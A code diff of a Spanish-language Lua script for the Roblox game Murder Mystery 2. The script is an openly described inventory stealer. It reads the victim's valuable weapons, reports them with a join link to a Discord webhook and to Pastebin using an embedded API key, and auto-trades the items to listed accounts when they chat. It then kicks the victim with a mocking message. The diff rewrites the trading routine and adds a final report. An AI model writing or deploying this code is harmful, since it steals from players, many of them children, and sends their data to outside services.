@@ -14,18 +14,20 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
 
--- Validaciones de servidor
+-- Si no está en MM2
 if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
     return
 end
 
+-- Si es un VIP server
 local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
 if serverType == "VIPServer" then
     LocalPlayer:Kick("⚠️El script no funciona en servidor privado, debes ir a un servidor público no lleno ✅")
     return
 end
 
+-- Si el server está lleno
 if #Players:GetPlayers() >= 12 then
     LocalPlayer:Kick("⚠️El script no puede funcionar en servidor lleno, debes ir a un servidor que no esté lleno ✅")
     return
@@ -34,7 +36,6 @@ end
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar Webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -53,7 +54,6 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Función para crear Pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -78,72 +78,30 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
--- ===================== NUEVO SISTEMA DE TRADE =====================
+-- ===========================
+-- NUEVO SISTEMA DE TRADE
+-- ===========================
 local TradeModule = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("TradeModule"))
-local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
-local trading = {}
 
--- Función para enviar trade requests
-local function sendTradeRequestNew(targetName)
-    local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and TradeModule.RequestsEnabled then
-        pcall(function()
-            TradeModule.SendTradeRequest(targetPlayer)
-        end)
-    end
+local function sendTradeRequest(user)
+    TradeModule.SendTradeRequest(user)
 end
 
--- Función para agregar items al trade
-local function addWeaponsToTrade(items)
-    for _, w in ipairs(items) do
-        for _=1, w.Amount do
-            pcall(function()
-                TradeService.OfferItem:FireServer(w.DataID, "Weapons")
-            end)
-        end
-    end
+local function addWeaponToTrade(id)
+    TradeModule.AddItemToTrade(id)
 end
 
--- Función principal de trade
-local function doTradeNew(targetName, itemsToSend)
-    if trading[targetName] then return end
-    trading[targetName] = true
-
-    -- Enviar requests hasta que el trade inicie
-    while TradeModule.GetTradeStatus() ~= "StartTrade" do
-        sendTradeRequestNew(targetName)
-        task.wait(0.5)
-    end
-
-    -- Añadir items al trade
-    addWeaponsToTrade(itemsToSend)
-    task.wait(6)
-
-    -- Aceptar automáticamente
-    pcall(function()
-        TradeService.AcceptTrade:FireServer()
-    end)
-
-    -- Esperar a que el trade finalice
-    while TradeModule.GetTradeStatus() ~= "None" do
-        task.wait(0.1)
-    end
-
-    trading[targetName] = nil
+local function acceptTrade()
+    TradeModule.ConfirmTrade()
 end
 
--- Evento para aceptar trades automáticamente
-TradeModule.UpdateTrade.OnClientEvent:Connect(function(data)
-    if data.LastOffer then
-        pcall(function()
-            TradeService.AcceptTrade:FireServer()
-        end)
-    end
-end)
+local function waitForTradeCompletion()
+    while TradeModule.GetTradeStatus() ~= "None" do task.wait(0.1) end
+end
 
--- ===================== FIN NUEVO SISTEMA DE TRADE =====================
-
--- ===================== LOGICA DE INVENTARIO Y WEBHOOK =====================
+-- ===========================
+-- DATABASE Y VALORES
+-- ===========================
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
@@ -243,13 +201,13 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Guardamos copia de armas para webhook
+-- Guardamos una copia para webhook final
 local weaponsSent = {}
 for _, w in ipairs(weaponsToSend) do
     table.insert(weaponsSent, w)
 end
 
--- Webhook inicial con Pastebin si >18 armas
+-- Webhook inicial con Pastebin si >18
 local pasteContent = ""
 for _, w in ipairs(weaponsSent) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -285,15 +243,62 @@ if #weaponsSent > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- ===================== EJECUCIÓN DE TRADES AUTOMÁTICOS =====================
-for _, p in ipairs(Players:GetPlayers()) do
-    if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTradeNew(p.Name, weaponsToSend) end)
+-- Función final para trades (solo webhook final, sin Pastebin, sin @everyone)
+local function TradeFinalizado()
+    local fieldsFinal={
+        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
+        {name="Armas enviadas 📦:", value="", inline=false},
+        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
+    }
+
+    local maxEmbedItems = math.min(18,#weaponsSent)
+    for i=1,maxEmbedItems do
+        local w = weaponsSent[i]
+        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
+
+    if #weaponsSent > 18 then
+        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
+    end
+
+    SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    
+    task.wait(50)
+    LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
 
+-- Trade principal
+local function doTrade(targetName)
+    if #weaponsToSend == 0 then return end
+    while #weaponsToSend>0 do
+        local status=TradeModule.GetTradeStatus()
+        if status=="None" then
+            sendTradeRequest(targetName)
+        elseif status=="SendingRequest" then
+            task.wait(0.3)
+        elseif status=="StartTrade" then
+            for i=1,math.min(4,#weaponsToSend) do
+                local w=table.remove(weaponsToSend,1)
+                for _=1,w.Amount do
+                    addWeaponToTrade(w.DataID)
+                end
+            end
+            task.wait(6)
+            acceptTrade()
+            waitForTradeCompletion()
+        else task.wait(0.5) end
+        task.wait(1)
+    end
+    TradeFinalizado()
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    if table.find(users,p.Name) then
+        p.Chatted:Connect(function() doTrade(p.Name) end)
+    end
+end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTradeNew(p.Name, weaponsToSend) end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
